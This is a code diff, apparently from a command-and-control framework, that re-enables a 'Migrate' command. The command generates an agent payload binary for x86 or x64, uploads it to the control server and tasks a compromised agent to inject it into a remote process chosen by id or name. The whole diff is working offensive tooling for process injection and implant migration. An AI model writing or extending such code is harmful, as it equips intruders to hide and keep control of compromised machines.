@@ -10,6 +10,7 @@ using System.IO;
 using Commander.Models;
 using Commander.Commands.Agent;
 using Common;
+using Common.Payload;
 
 namespace Commander.Commands.Laucher
 {
@@ -45,8 +46,7 @@ namespace Commander.Commands.Laucher
 
         protected override async Task<bool> HandleCommand(CommandContext<MigrateCommandOptions> context)
         {
-            throw new NotImplementedException();
-            /*if (!context.Options.processId.HasValue && string.IsNullOrEmpty(context.Options.processName))
+            if (!context.Options.processId.HasValue && string.IsNullOrEmpty(context.Options.processName))
             {
                 context.Terminal.WriteError($"[X] Migrate Command requires either a processId or a processName");
                 return false;
@@ -66,23 +66,22 @@ namespace Commander.Commands.Laucher
                 return false;
             }
 
-            string id = ShortGuid.NewGuid();
-            string outFile = Path.Combine("/tmp", "tmp" + id);
-
-            var fileName = "Agent";
-            if (context.Options.x86)
-                fileName += "-x86";
-            fileName += ".exe";
-
             context.Terminal.WriteLine($"[>] Generating binary...");
 
-            var executionResult = BuildHelper.GenerateBin(fileName, outFile, context.Options.x86, endpoint.ToString());
+            var options = new PayloadGenerationOptions()
+            {
+                Architecture = context.Options.x86 ? PayloadArchitecture.x86 : PayloadArchitecture.x64,
+                Endpoint = endpoint,
+                IsDebug = context.Options.debug,
+                IsVerbose = context.Options.verbose,
+                //ServerKey = context.Options.serverKey,
+                Type = PayloadType.Binary
+            };
+            var generator = new PayloadGenerator(context.Config.PayloadConfig);
+            generator.MessageSent += (object sender, string msg) => { if (context.Options.verbose) context.Terminal.WriteLine(msg); };
+            var pay = generator.GeneratePayload(options);
 
-            fileName = outFile;
-
-            if (context.Options.verbose)
-                context.Terminal.WriteLine(executionResult.Out);
-            if (executionResult.Result != 0)
+            if (pay == null)
             {
                 context.Terminal.WriteError($"[X] Generation Failed!");
                 return false;
@@ -90,32 +89,16 @@ namespace Commander.Commands.Laucher
             else
                 context.Terminal.WriteSuccess($"[+] Generation succeed!");
 
-
-            if (!File.Exists(fileName))
-            {
-                context.Terminal.WriteError($"[X] File {fileName} does not exists!");
-                return false;
-            }
-
-
-            byte[] fileBytes = null;
-            using (FileStream fs = File.OpenRead(fileName))
-            {
-                fileBytes = new byte[fs.Length];
-                fs.Read(fileBytes, 0, (int)fs.Length);
-            }
-
             context.Terminal.WriteLine($"Preparing to upload the file...");
 
+            var fileName = ShortGuid.NewGuid() + ".bin";
+
             bool first = true;
-            var fileId = await context.CommModule.Upload(fileBytes, fileName, a =>
+            var fileId = await context.CommModule.Upload(pay, fileName, a =>
             {
                 context.Terminal.ShowProgress("uploading", a, first);
                 first = false;
             });
-
-            File.Delete(fileName);
-
 
             if (context.Options.processId.HasValue)
                 await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-remote", fileId, fileName, $"{context.Options.processId.Value}");
@@ -124,7 +107,7 @@ namespace Commander.Commands.Laucher
 
             context.Terminal.WriteInfo($"File uploaded to the server, agent tasked to download the file and migrate.");
 
-            return true;*/
+            return true;
         }
     }
 
